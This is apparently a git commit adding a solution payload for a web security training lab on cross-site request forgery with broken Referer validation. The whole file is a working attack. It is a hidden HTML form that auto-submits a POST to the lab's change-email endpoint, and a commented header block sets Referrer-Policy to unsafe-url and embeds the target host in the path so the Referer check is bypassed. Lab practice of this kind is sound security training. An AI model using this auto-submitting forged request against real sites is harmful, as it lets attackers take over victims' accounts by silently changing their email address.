3a01feea970912029a240b1006539621bebf0382
Pranjal <pranjalruhela2811@gmail.com>
2023-06-29 15:47:21 +0530

    broken referer validation

---
+++ CSRF/CSRF with broken Referer validation/payload.js
@@ -0,0 +1,19 @@
+/*
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Referrer-Policy: unsafe-url
+
+
+/0a5b00570496ef2c808acbb100f100c9.web-security-academy.net
+*/
+
+<html>
+    <body>
+        <form action = "https://0a5b00570496ef2c808acbb100f100c9.web-security-academy.net/my-account/change-email" method = "POST">
+            <input type="hidden" name="email" value="hcgube@ff.net"/>
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
